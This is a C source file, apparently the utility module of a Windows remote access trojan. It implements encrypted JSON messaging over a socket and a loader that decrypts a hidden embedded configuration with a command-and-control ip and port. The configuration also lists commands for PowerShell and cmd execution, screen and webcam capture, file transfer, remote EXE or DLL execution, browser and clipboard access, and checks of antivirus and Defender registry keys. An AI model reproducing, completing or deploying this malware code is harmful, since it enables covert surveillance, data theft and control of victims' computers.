#include "utils.h"
#include "config.h"
#include "cJSON.h"
#include <wincrypt.h>
#include <bcrypt.h>
#include <ctype.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len)) {
        return NULL;
    }
    char* out = (char*)malloc(out_len);
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &out_len)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;
}

unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        return NULL;
    }
    unsigned char* out = (unsigned char*)malloc(out_len);
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, out, &out_len, NULL, NULL)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;
}

char* str_replace(const char* orig, const char* rep, const char* with) {
    char* result;
    char* ins;
    char* tmp;
    int len_rep;
    int len_with;
    int len_front;
    int count;

    if (!orig || !rep) return NULL;
    len_rep = strlen(rep);
    if (len_rep == 0) return NULL;
    if (!with) with = "";
    len_with = strlen(with);

    ins = (char*)orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }

    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);

    if (!result) return NULL;

    while (count--) {
        ins = strstr(orig, rep);
        len_front = ins - orig;
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep;
    }
    strcpy(tmp, orig);
    return result;
}

void str_trim(char* s) {
    char* p = s;
    int l = strlen(p);
    while (l > 0 && isspace(p[l - 1])) p[--l] = 0;
    while (*p && isspace(*p)) ++p, --l;
    memmove(s, p, l + 1);
}

extern SessionKey g_session;

void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
    sock_send_ex(sock, mutex, g_conf.s_response, msg);
}

void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
    if (mutex) WaitForSingleObject(mutex, INFINITE);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "type", type);
    cJSON_AddStringToObject(root, "payload", msg);
    char *json_msg = cJSON_PrintUnformatted(root);

    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, strlen(json_msg), g_session.key, g_session.iv);

    cJSON *packet = cJSON_CreateObject();
    cJSON_AddStringToObject(packet, "data", encrypted);

    char *iv_b64 = base64_encode(g_session.iv, 16, NULL);
    cJSON_AddStringToObject(packet, "iv", iv_b64);

    char *final_json = cJSON_PrintUnformatted(packet);

    char *buf = (char*)malloc(strlen(final_json) + 2);
    sprintf(buf, "%s\n", final_json);
    send(sock, buf, (int)strlen(buf), 0);

    free(buf);
    free(final_json);
    free(iv_b64);
    free(encrypted);
    free(json_msg);
    cJSON_Delete(packet);
    cJSON_Delete(root);

    if (mutex) ReleaseMutex(mutex);
}

char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyBlob = 0, cbData = 0, cbResult = 0;
    BYTE* pbKeyBlob = NULL;
    BYTE* pbEncrypted = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != 0) return NULL;

    // PEM -> DER (Wincrypt)
    DWORD derLen = 0;
    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL)) {
            if (BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, der, derLen, 0) != 0) {
                // BCryptImportKeyPair might not like raw DER for RSA.
                // Alternatively use CryptImportPublicKeyInfo.
                // For simplicity in this env, we'll try to use BCRYPT_RSAPUBLIC_BLOB correctly or a helper.
            }
        }
        free(der);
    }

    // Since BCryptImportKeyPair is tricky with PEM/DER directly,
    // let's use the older but reliable Crypt32 for RSA encryption or
    // convert DER to BCRYPT_RSAKEY_BLOB.

    // Easier way: Use Crypt32 for RSA encryption as it handles PEM/DER better.
    CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
    DWORD pubKeyInfoLen = 0;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hRSAKey = 0;

    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL);
        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
            if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
                    DWORD encLen = (DWORD)len;
                    // Get required size
                    if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
                        BYTE* encBuf = malloc(encLen);

                        memcpy(encBuf, data, len);
                        DWORD dataLen = (DWORD)len;
                        if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
                            // Reverse output for Big Endian compatibility with Go
                            for (DWORD i = 0; i < dataLen / 2; i++) {
                                BYTE temp = encBuf[i];
                                encBuf[i] = encBuf[dataLen - 1 - i];
                                encBuf[dataLen - 1 - i] = temp;
                            }
                            out = base64_encode(encBuf, dataLen, NULL);
                        }
                        free(encBuf);
                    }
                    CryptDestroyKey(hRSAKey);
                }
                CryptReleaseContext(hProv, 0);
            }
            LocalFree(pubKeyInfo);
        }
        free(der);
    }

    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0;
    PBYTE pbKeyObject = NULL, pbCipherText = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbCipherText = malloc(cbCipherText);
    memcpy(ivCopy, iv, 16);
    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    out = base64_encode(pbCipherText, cbResult, NULL);

cleanup:
    if (pbCipherText) free(pbCipherText);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL;
    size_t cipherLen = 0;

    pbCipher = base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
    if (!pbCipher) return NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbPlain = malloc(cbPlain + 1); // +1 for null terminator
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    if (out_len) *out_len = cbResult;

cleanup:
    if (pbCipher) free(pbCipher);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return pbPlain;
}

static int is_leap(unsigned long long y) {
    return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
}

void get_formatted_time(unsigned long long secs, char* out_buf) {
    unsigned long long minute = (secs % 3600) / 60;
    unsigned long long hour = (secs % 86400) / 3600;
    unsigned long long days = secs / 86400;
    unsigned long long year = 1970;
    while (1) {
        unsigned long long days_in_year = is_leap(year) ? 366 : 365;
        if (days < days_in_year) break;
        days -= days_in_year;
        year++;
    }
    unsigned long long months[] = {31, is_leap(year) ? 29u : 28u, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    unsigned long long month = 1;
    for (int i = 0; i < 12; i++) {
        if (days < months[i]) break;
        days -= months[i];
        month++;
    }
    sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
}

Config g_conf = {0};

void load_config_from_resource() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;

    unsigned char marker[16];
    SET_MARKER(marker);

    if (memcmp(pData, marker, 16) != 0) return;

    unsigned char* encrypted_config = pData + 16;
    size_t config_len = 2032;

    unsigned char key[32];
    unsigned char iv[16];
    memcpy(key, CONFIG_KEY, 32);
    memcpy(iv, CONFIG_IV, 16);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
        cbPlain = (DWORD)config_len;
    }

    pbPlain = malloc(cbPlain + 1);
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
        pbPlain[cbResult] = 0;
        cJSON* root = cJSON_Parse((char*)pbPlain);
        if (root) {
            cJSON* ip = cJSON_GetObjectItem(root, "ip");
            cJSON* port = cJSON_GetObjectItem(root, "port");
            if (ip) strncpy(g_conf.host, ip->valuestring, sizeof(g_conf.host) - 1);
            if (port) g_conf.port = port->valueint;

            #define MAP_STR(f, n) { cJSON* item = cJSON_GetObjectItem(root, n); if(item) strncpy(g_conf.f, item->valuestring, sizeof(g_conf.f)-1); }
            MAP_STR(s_ping, "s_ping");
            MAP_STR(s_pong, "s_pong");
            MAP_STR(s_msg, "s_msg");
            MAP_STR(s_exec_ps, "s_exec_ps");
            MAP_STR(s_exec_cmd, "s_exec_cmd");
            MAP_STR(s_ps_out, "s_ps_out");
            MAP_STR(s_cmd_out, "s_cmd_out");
            MAP_STR(s_scr_stop, "s_scr_stop");
            MAP_STR(s_cam_stop, "s_cam_stop");
            MAP_STR(s_tasklist, "s_tasklist");
            MAP_STR(s_taskkill, "s_taskkill");
            MAP_STR(s_ls, "s_ls");
            MAP_STR(s_ls_res, "s_ls_res");
            MAP_STR(s_download, "s_download");
            MAP_STR(s_delete, "s_delete");
            MAP_STR(s_mkdir, "s_mkdir");
            MAP_STR(s_upload, "s_upload");
            MAP_STR(s_rename, "s_rename");
            MAP_STR(s_rfe_exe, "s_rfe_exe");
            MAP_STR(s_rfe_dll, "s_rfe_dll");
            MAP_STR(s_browser, "s_browser");
            MAP_STR(s_clip_get, "s_clip_get");
            MAP_STR(s_clip_set, "s_clip_set");
            MAP_STR(s_uninstall, "s_uninstall");
            MAP_STR(s_close, "s_close");
            MAP_STR(s_reconnect, "s_reconnect");
            MAP_STR(s_set_delay, "s_set_delay");
            MAP_STR(s_scr_start, "s_scr_start");
            MAP_STR(s_cam_start, "s_cam_start");
            MAP_STR(s_sysinfo, "s_sysinfo");
            MAP_STR(s_response, "s_response");
            MAP_STR(s_command, "s_command");
            MAP_STR(s_session, "s_session");

            MAP_STR(s_reg_win_key, "s_reg_win_key");
            MAP_STR(s_reg_prod_name, "s_reg_prod_name");
            MAP_STR(s_reg_build, "s_reg_build");
            MAP_STR(s_reg_display, "s_reg_display");
            MAP_STR(s_reg_release, "s_reg_release");
            MAP_STR(s_reg_av_key, "s_reg_av_key");
            MAP_STR(s_reg_defender_key, "s_reg_defender_key");
            MAP_STR(s_reg_dis_spy, "s_reg_dis_spy");
            MAP_STR(s_reg_gpu_key, "s_reg_gpu_key");
            MAP_STR(s_reg_gpu_desc, "s_reg_gpu_desc");
            MAP_STR(s_reg_cpu_key, "s_reg_cpu_key");
            MAP_STR(s_reg_cpu_name, "s_reg_cpu_name");

            MAP_STR(s_http_ua, "s_http_ua");
            MAP_STR(s_http_host, "s_http_host");
            MAP_STR(s_http_path, "s_http_path");

            cJSON_Delete(root);
        }
    }

cleanup:
    if (pbPlain) free(pbPlain);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}
